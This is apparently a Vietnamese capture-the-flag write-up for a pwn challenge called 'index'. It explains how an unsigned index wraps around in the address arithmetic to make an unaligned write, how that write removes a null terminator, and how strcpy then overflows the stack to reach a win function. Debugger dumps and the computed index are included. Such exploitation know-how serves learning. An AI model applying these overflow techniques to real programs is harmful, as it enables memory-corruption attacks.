# write up index
- với bài này ta có thể chạy vòng lặp vô hạn
```c
    while (1) {
        puts("\n1. Edit a message");
        puts("2. Read a message");
        puts("3. Exit\n");
        unsigned long choice = get();
        if (choice == 1) {
            puts("Enter an index to edit (0-2):");
            char* ptr = get_message(get());
            puts("Enter your new message:");
            memset(ptr, 0, 100);
            read(STDIN_FILENO, ptr, 99);
        }  else if (choice == 2) {
            puts("Enter an index to read (0-2):");
            Message tmp;
            strcpy(tmp, get_message(get()));
            puts(tmp);
        } else {
            break;
        }
    }
```
- vì bài khai báo biến index là unsigned nhưng không check đầu vào từ đây 
```c
unsigned long get() {
    unsigned long i = 0;
    scanf("%lu", &i);
    return i;
}
```
trong ida thấy được rằng index được check từ đây, địa chỉ khi lấy dữ liệu phải nằm trong khoảng địa chỉ mà chương trình cho phép
```c
char *__fastcall get_message(__int64 idx)
{
  if ( &start[100 * idx] < start || end < &start[100 * idx] )
  {
    puts("That's not allowed!");
    exit(0);
  }
  return &start[100 * idx];
}
```
- vì thế index cũng phải phù hợp để làm sao khi trả về địa chỉ thì nằm trong khoảng cho phép này
- sức chứa của 1 thanh ghi chỉ là 0xffffffffffffff vì thế khi nhập quá giới hạn thì sẽ bị tràn và dẫn đến sai giá trị, vì thế thông qua đây ta có thể làm sao cho nó bị tràn để khi đi qua các instruction này thì giá trị sẽ trở thành 1 con số mà khi cộng với địa chỉ sẽ truy xuất đến nơi mà mình mong muốn
```assembly
.text:00000000004011F8                 shl     rax, 2
.text:00000000004011FC                 add     rax, rdx
.text:00000000004011FF                 lea     rdx, ds:0[rax*4]
.text:0000000000401207                 add     rax, rdx
.text:000000000040120A                 shl     rax, 2
.text:000000000040120E                 lea     rdx, start  
```
-  vì memset là 100 mà nhập vào chỉ có 99 bytes, trong khi đó việc truy suất đến các phần tử mảng là aligned nên mục tiêu nhắm tới là làm sao cho việc đọc ghi đè được 1 byte null để từ đó nối chuỗi lại và gây ra buff
```c
memset(ptr, 0, 100);
            read(STDIN_FILENO, ptr, 99);
```

- để làm được thì chỉ cần làm sao cho index nhắm tới phần địa chỉ lẻ không chia hết cho 8
```python
>>> 0xffffffffffffffff
18446744073709551615
>>> 
```
- đây là giá trị max 1 thanh ghi có thể chứa, khi cộng thêm 1 thì sẽ trở thành như này
```c
>>> hex(18446744073709551615+1)
'0x10000000000000000'
>>> 
```
vì thế chỉ cần cộng làm sao cho nó ra 1 index vừa đủ mà có thể chia cho 10-0 để từ đó có thể dùng để truy xuất đến phần tử trong mảng giá trị max cộng thêm 64 nữa là vừa đủ , nên cẩn trọng với các con số khi cộng vì nó có thể đưa đi quá xa, đây có thể là giá trị đầu tiên phải thử 
```c
>>> 0xffffffffffffffff+85
18446744073709551700
```
- phải đảm bảo đủ 8 bytes
```c
>>> hex(18446744073709551700)
'0x10000000000000054'
>>>
```
- khi qua các instructions thì index sẽ chỉ còn như này ở rax, vậy là thành công
```assembly
*RAX  0x54
 RBX  0x0
 RCX  0x10
 RDI  0x28f5c28f5c28f5d
 RSI  0x1
 RDX  0x3333333333333344 ('D3333333')
 R10  0x7ffff7f77ae0 ◂— 0x100000000
 R8   0x7fffffffe192 ◂— 0x0
 R9   0x0
 R11  0x7ffff7f783e0 ◂— 0x2000200020002
```
sau khi cộng thì sẽ được địa chỉ nằm trong vùng đó 
```assembly
*RAX  0x404074 (MESSAGES+84) ◂— 'bbbbbbbbbbbbbbb'
 RBX  0x0
 RCX  0x10
 RDI  0x28f5c28f5c28f5d
 RSI  0x1
 RDX  0x404020 (MESSAGES) ◂—
```
- chỉ cần nằm trong vùng messages là ok

- kịch bản là nhập index 0 để ghi full chuỗi đầu, tiếp theo là dùng index ở trên để ghi đè null byte rồi dùng tiếp index 1 thì index 0 và index 1 dữ liệu sẽ dược nối với nhau để thông qua đó overflow stack qua strcpy
```c
   if ( result_1 != 2 )
      break;
    puts("Enter an index to read (0-2):");
    idx = get();
    message = get_message(idx);
    strcpy(dest, message);
    puts(dest);
```
 - như ở dưới là dữ liệu được nối từ index 0 qua index 1
```assembly
 0x40401c (__dso_handle+20) ◂— 0x6262626200000000
16:00b0│  0x404024 (MESSAGES+4) ◂— 0x6262626262626262 ('bbbbbbbb')
17:00b8│  0x40402c (MESSAGES+12) ◂— 0x6262626262626262 ('bbbbbbbb')
pwndbg>
18:00c0│  0x404034 (MESSAGES+20) ◂— 0x6262626262626262 ('bbbbbbbb')
19:00c8│  0x40403c (MESSAGES+28) ◂— 0x6262626262626262 ('bbbbbbbb')
1a:00d0│  0x404044 (MESSAGES+36) ◂— 0x6262626262626262 ('bbbbbbbb')
1b:00d8│  0x40404c (MESSAGES+44) ◂— 0x6262626262626262 ('bbbbbbbb')
1c:00e0│  0x404054 (MESSAGES+52) ◂— 0x6262626262626262 ('bbbbbbbb')
1d:00e8│  0x40405c (MESSAGES+60) ◂— 0x6262626262626262 ('bbbbbbbb')
1e:00f0│  0x404064 (MESSAGES+68) ◂— 0x6262626262626262 ('bbbbbbbb')
1f:00f8│  0x40406c (MESSAGES+76) ◂— 0x6262626262626262 ('bbbbbbbb')
pwndbg>
20:0100│  0x404074 (MESSAGES+84) ◂— 0x6161616161616161 ('aaaaaaaa')
21:0108│  0x40407c (MESSAGES+92) ◂— 0x6161616161616161 ('aaaaaaaa')
22:0110│  0x404084 (MESSAGES+100) ◂— 0x6262626262626262 ('bbbbbbbb')
23:0118│  0x40408c (MESSAGES+108) ◂— 0x6262626262626262 ('bbbbbbbb')
24:0120│  0x404094 (MESSAGES+116) ◂— 0x6262626262626262 ('bbbbbbbb')
25:0128│  0x40409c (MESSAGES+124) ◂— 0x6262626262626262 ('bbbbbbbb')
26:0130│  0x4040a4 (MESSAGES+132) ◂— 0x40129462626262
```

- vì bài có hàm win nên chỉ cần bỏ vào trực tiếp là có thể lấy flag được rồi
- 
